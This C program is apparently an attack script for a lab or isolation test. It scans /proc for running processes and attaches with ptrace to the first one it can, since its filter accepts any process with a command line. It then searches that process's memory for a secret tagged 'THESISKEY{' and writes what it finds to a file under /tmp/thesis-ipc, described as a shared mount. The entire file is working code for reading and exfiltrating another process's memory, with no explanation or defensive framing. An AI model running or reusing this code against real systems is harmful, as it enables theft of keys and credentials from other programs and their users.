#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/uio.h>
#include <sys/inotify.h>
#include <signal.h>
#include <time.h>

void *search_memory(pid_t pid, const char *pattern) {
    char buffer[65536];

    for (unsigned long addr = 0x400000; addr < 0x100000000UL; addr += 4096) {
        struct iovec local, remote;
        local.iov_base = buffer;
        local.iov_len = sizeof(buffer);
        remote.iov_base = (void*)addr;
        remote.iov_len = sizeof(buffer);

        ssize_t nread = process_vm_readv(pid, &local, 1, &remote, 1, 0);
        if (nread > 0) {
            char *found = memmem(buffer, nread, pattern, strlen(pattern));
            if (found) {
                // Return approximate address
                return (void*)(addr + (found - buffer));
            }
        }
    }
    return NULL;
}

int main() {
    printf("Starting victim process monitor...\n");
    printf("Waiting for victim process to spawn...\n");

    // Monitor /proc for new processes
    time_t start = time(NULL);
    int max_wait = 60;  // Wait up to 60 seconds

    while (time(NULL) - start < max_wait) {
        // Try to attach to a high PID that might be the victim
        for (pid_t pid = 2; pid < 10000; pid++) {
            // Check if process exists and is accessible
            char cmdline_path[256];
            snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
            FILE *f = fopen(cmdline_path, "r");
            if (!f) continue;

            char cmdline[256] = {0};
            fread(cmdline, 1, sizeof(cmdline)-1, f);
            fclose(f);

            // Look for the victim process - it should be a C program
            if (strstr(cmdline, "victim") || strstr(cmdline, "thesis") || strlen(cmdline) > 0) {
                printf("Found candidate process PID %d: %.100s\n", pid, cmdline);

                // Try to attach
                if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == 0) {
                    int status;
                    waitpid(pid, &status, 0);
                    printf("Successfully attached to PID %d!\n", pid);

                    // Search for secret
                    void *found = search_memory(pid, "THESISKEY{");
                    if (found) {
                        printf("Found THESISKEY at address %p\n", found);

                        // Try to read it more precisely
                        char buffer[1024];
                        struct iovec local, remote;
                        local.iov_base = buffer;
                        local.iov_len = sizeof(buffer);
                        remote.iov_base = (void*)((unsigned long)found - 100);
                        remote.iov_len = sizeof(buffer);

                        ssize_t nread = process_vm_readv(pid, &local, 1, &remote, 1, 0);
                        if (nread > 0) {
                            printf("Secret data: %.500s\n", buffer);

                            // Write to shared mount
                            FILE *out = fopen("/tmp/thesis-ipc/secret.txt", "w");
                            if (out) {
                                fwrite(buffer, 1, nread, out);
                                fclose(out);
                                printf("Wrote secret to /tmp/thesis-ipc/secret.txt\n");
                            }
                        }
                    }

                    ptrace(PTRACE_DETACH, pid, NULL, NULL);
                    return 0;
                }
            }
        }

        sleep(1);
    }

    printf("Timeout waiting for victim process\n");
    return 1;
}
